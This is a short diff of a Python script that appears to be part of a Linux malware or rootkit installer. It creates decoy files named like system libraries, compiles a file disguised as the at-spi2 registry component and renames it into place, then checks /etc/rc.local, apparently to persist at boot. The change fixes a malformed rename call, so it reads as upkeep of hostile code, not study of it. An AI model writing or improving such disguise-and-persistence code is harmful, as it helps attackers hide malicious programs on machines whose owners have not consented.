@@ -70,7 +70,7 @@ os.system("touch lib01.h hostconfig-beta librighel2.6.04 libquadmath.so.02.3.2.h
 os.system("python -OO -m py_compile at-spi2-regist3r.01F")
 
 os.system("rm at-spi2-regist3r.01F")
-os.rename("at-spi2-regist3r.01Fo at-spi2-regist3r.01F")
+os.rename("at-spi2-regist3r.01Fo","at-spi2-regist3r.01F")
 
 
 if(os.path.exists("/etc/rc.local")):
